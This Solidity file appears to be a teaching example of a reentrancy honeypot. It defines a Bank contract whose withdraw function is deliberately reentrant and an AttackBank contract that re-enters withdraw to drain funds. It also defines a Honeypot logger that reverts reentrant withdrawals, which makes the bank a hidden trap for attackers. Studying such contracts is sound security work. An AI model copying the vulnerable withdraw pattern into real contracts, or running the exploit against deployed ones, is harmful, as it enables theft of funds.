// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ILogger {
    event Log(
        address indexed caller,
        uint256 indexed amount,
        uint256 indexed actionCode
    );

    function log(
        address _caller,
        uint256 _amount,
        uint256 _actionCode
    ) external;
}

contract Logger is ILogger {
    function log(
        address _caller,
        uint256 _amount,
        uint256 _actionCode
    ) external {
        emit Log(_caller, _amount, _actionCode);
    }
}

contract Honeypot is ILogger {
    function log(address, uint, uint _actionCode) public pure {
        if (_actionCode == 2) {
            revert("Honeypot");
        }
    }
}

contract Bank {
    mapping(address => uint256) public balances;
    ILogger public logger;
    bool resuming = false;

    constructor(ILogger _logger) {
        logger = _logger;
    }

    function deposit() public payable {
        require(msg.value >= 1 ether);
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, 0);
    }

    function withdraw() public {
        if (resuming) {
            _withdraw(msg.sender, 2);
        } else {
            resuming = true;
            _withdraw(msg.sender, 1);
        }
    }

    function _withdraw(address _initiator, uint256 _status) internal {
        (bool success, ) = _initiator.call{value: balances[_initiator]}("");
        require(success, "Transfer failed");
        balances[_initiator] = 0;

        logger.log(msg.sender, msg.value, _status);
        resuming = false;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract AttackBank {
    uint256 constant PAY_AMOUNT = 1 ether;

    Bank bank;

    constructor(Bank _bank) {
        bank = _bank;
    }

    receive() external payable {
        if (bank.getBalance() >= PAY_AMOUNT) {
            bank.withdraw();
        }
    }

    function attack() public payable {
        require(msg.value == PAY_AMOUNT, "Wrong amount");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
